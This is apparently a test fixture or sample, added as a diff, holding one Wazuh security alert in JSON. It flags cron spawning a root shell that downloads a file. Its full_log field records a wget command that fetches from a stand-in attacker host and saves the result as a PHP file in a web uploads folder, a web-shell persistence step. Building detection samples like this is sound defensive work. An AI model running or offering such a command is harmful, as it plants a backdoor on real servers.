@@ -1,0 +1,21 @@
+{
+  "timestamp": "2023-04-25T16:32:00.000000Z",
+  "id": "1682435520.0503",
+  "rule": {
+    "id": "100300",
+    "level": 12,
+    "description": "Suspicious process lineage: cron spawned a shell that downloads a file (persistence).",
+    "groups": ["ossec", "auditd", "custom"],
+    "firedtimes": 1
+  },
+  "agent": { "id": "002", "name": "centos7" },
+  "manager": { "name": "wazuh-manager" },
+  "decoder": { "name": "auditd" },
+  "data": {
+    "process_name": "sh",
+    "parent_process_name": "cron",
+    "user": "root"
+  },
+  "full_log": "auditd: parent_process=cron child_process=sh user=root cmdline=/bin/sh -c wget http://updates.evil-baseline.example/x.txt -O /var/www/html/uploads/sh.php",
+  "location": "/var/log/audit/audit.log"
+}
